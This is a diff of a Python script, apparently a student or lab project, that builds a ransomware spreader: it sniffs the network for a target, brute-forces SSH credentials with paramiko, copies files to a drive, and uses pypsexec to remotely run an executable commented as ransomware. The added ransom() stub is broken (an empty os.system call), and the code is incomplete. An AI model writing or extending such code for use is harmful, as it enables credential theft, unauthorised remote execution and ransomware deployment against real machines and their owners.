@@ -1,13 +1,19 @@
 #!/usr/bin/env python3
 
-
+import os
 import paramiko #Bruteforcing SSH connection
 import time #Bruteforcing SSH connection
 from pypsexec.client import Client #Sending remote commands
 
-#play video
 
+    
 #def encrypt file
+def ransom():
+    os.system()
+
+#play video
+def playVideo():
+    os.system("cd C:\\Users\\IEUser\\Downloads")
 
 # sniff network 
 def sniffNetwork():
@@ -31,6 +37,8 @@ def bruteForce(user, ipAddress):
             print(secret)
 
 #Transfer
+def transferFile():
+    os.system("robocopy C:\\Users\\IEUser\Downloads P:\\  ") #P:\\ zip folder
 
 #Remote execute file
 def remoteExecute(ipAddress, user, password):
@@ -38,12 +46,14 @@ def remoteExecute(ipAddress, user, password):
     c.connect()
     try:
         c.create_service()
-        stdout, stderr, rc = c.run_executable("C:\\Users\\IEUser\\Desktop\\registration.exe")
+        stdout, stderr, rc = c.run_executable("P:\\registration.exe") #Execute ransomware from P Drive
     except:
         print("done")
 
 def main():
     user= "IEUser"
+    ransom()
+    playVideo()
     ipAddress= sniffNetwork()
     print(ipAddress)
     password=bruteForce(user,ipAddress)
